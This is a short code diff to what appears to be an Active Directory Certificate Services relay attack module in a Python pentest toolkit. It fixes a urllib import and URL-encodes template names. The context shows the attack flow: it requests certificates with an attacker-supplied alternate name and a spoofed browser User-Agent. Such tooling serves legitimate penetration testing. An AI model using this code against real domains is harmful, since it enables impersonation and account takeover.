@@ -19,7 +19,7 @@ import re
 import base64
 import os
 from OpenSSL import crypto
-from urllib import parse
+import urllib.parse
 
 from cryptography import x509
 from cryptography.hazmat.primitives.serialization import pkcs12
@@ -49,12 +49,20 @@ class ADCSAttack:
         if current_template is None:
             current_template = "Machine" if self.username.endswith("$") else "User"
 
+        # Template name might be UTF-8
+        original_template = current_template
+        current_template = urllib.parse.quote(current_template)
+        if current_template == original_template:
+            LOG.info('Using template name: %s' % current_template)
+        else:
+            LOG.info('Using template name: %s (%s)' % (current_template, original_template))
+
         csr = self.generate_csr(key, self.username, self.config.altName)
         LOG.info("CSR generated!")
 
         certAttrib = self.generate_certattributes(current_template, self.config.altName)
 
-        data = parse.urlencode({"Mode": "newreq", "CertRequest": csr, "CertAttrib": certAttrib, "TargetStoreFlags": 0, "SaveCert": "yes", "ThumbPrint": ""})
+        data = urllib.parse.urlencode({"Mode": "newreq", "CertRequest": csr, "CertAttrib": certAttrib, "TargetStoreFlags": 0, "SaveCert": "yes", "ThumbPrint": ""})
         headers = {
             "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
             "Content-Type": "application/x-www-form-urlencoded",
